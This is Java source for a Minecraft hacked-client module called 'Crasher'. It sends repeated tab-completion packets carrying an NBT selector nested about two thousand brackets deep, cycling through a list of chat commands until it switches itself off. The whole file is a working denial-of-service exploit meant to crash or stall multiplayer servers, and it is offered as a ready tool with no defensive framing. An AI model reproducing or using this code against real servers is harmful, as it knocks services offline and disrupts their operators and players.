package sertyo.events.module.impl.util;

import com.darkmagician6.eventapi.EventTarget;
import io.netty.channel.Channel;
import me.sertyo.j2c.J2c;
import net.minecraft.network.IPacket;
import net.minecraft.network.play.client.CTabCompletePacket;
import sertyo.events.Main;
import sertyo.events.event.player.EventUpdate;
import sertyo.events.module.api.Category;
import sertyo.events.module.api.Module;
import sertyo.events.module.api.ModuleAnnotation;
import sertyo.events.util.math.TimerHelper;
import sertyo.events.util.player.ChatUtility;


import java.util.stream.Collectors;
import java.util.stream.IntStream;

import static sertyo.events.util.Util.mc;

@J2c
@ModuleAnnotation(name = "Crasher", description = "", category = Category.UTIL)
public class TabCompleteCrasher extends Module {

    private static final int packets = 3;

    private static final String NBT_EXECUTOR = " @a[nbt={PAYLOAD}]";

    private static final String[] KNOWN_WORKING_MESSAGES = {
            "msg",
            "minecraft:msg",
            "tell",
            "minecraft:tell",
            "tm",
            "teammsg",
            "minecraft:teammsg",
            "minecraft:w",
            "minecraft:whisper",
            "minecraft:me",
            "dm",
            "directmessage",
            "pm",
            "privatemessage"
    };

    static private int messageIndex = 0;

    static TimerHelper timerUtil = new TimerHelper();
    @EventTarget
    public void onUpdate(EventUpdate eventUpdate) {
        if (messageIndex == KNOWN_WORKING_MESSAGES.length - 1) {
            messageIndex = 0;
            Main.getInstance().getModuleManager().getModule(TabCompleteCrasher.class).setToggled(false);
            return;
        }
        if (timerUtil.hasReached(100)) {
            String knownMessage = KNOWN_WORKING_MESSAGES[messageIndex] + NBT_EXECUTOR;

            int len = 2044 - knownMessage.length();
            String overflow = generateJsonObject(len);
            String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

            Channel channel = mc.getConnection().getNetworkManager().channel;

            IPacket<?> packet = new CTabCompletePacket(0, partialCommand);

            for (int i = 0; i < packets; i++) {
                channel.write(packet);
            }
           channel.flush();
            ChatUtility.addChatMessage(String.format("Json successfly sended [%sbyte]", len));

            messageIndex++;
        }
    }

    private static String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        return "{a:" + json + "}";
    }
}